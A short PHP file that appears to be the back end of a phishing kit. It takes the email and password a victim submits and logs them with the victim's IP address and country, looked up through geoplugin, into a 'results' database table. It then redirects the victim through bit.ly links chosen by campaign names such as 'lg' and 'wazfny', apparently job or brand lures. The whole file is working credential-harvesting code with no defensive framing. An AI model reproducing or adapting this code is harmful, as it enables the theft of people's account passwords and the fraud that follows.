<?php

    if(isset($_GET['name']) && $_GET['name'] == 'lg'){

        // Go LG English Form
        $goDone = 'https://bit.ly/3odBNpTV1';
        $goFoem = 'https://bit.ly/3nqxTsJV1';
        
    } else if(isset($_GET['name']) && $_GET['name'] == 'wazfny'){

        // Go Wazfny
        $goDone = 'http://bit.ly/3sDaaJnV2';
        $goFoem = 'https://bit.ly/3irf2N4V2';
        
    } else{

        // Go Wazfny
        $goDone = 'http://bit.ly/3sDaaJnV3';
        $goFoem = 'https://bit.ly/3irf2N4V3';
    }
	include "connect.php";
	$myCountry = '';

    $myEmail = $_POST['email'];
    $myPassword = $_POST['password'];

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}    
    $stm1 = $con->prepare("SELECT * FROM results WHERE `ip` = ?");
    $stm1->execute(array($ip));
    $ifEx = $stm1->fetchAll();

    if(count($ifEx) > 0){
        
        header ("location:$goDone");

    }else{
    
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    
        
        $myCountry = strval($ipdat->geoplugin_countryName);

        $stmt = $con->prepare("INSERT INTO 
                results (email, `password`, `ip`, `country`, `date`)
                VALUES (:zEmail, :zPassword, :zIp, :zCountry, NOW())");

            $stmt->execute(array(

                'zEmail' => $myEmail,
                'zPassword' => $myPassword,
                'zCountry' => $myCountry,
                'zIp' => $ip
            ));

        header ("location:$goFoem");
        
    
    }

?> 
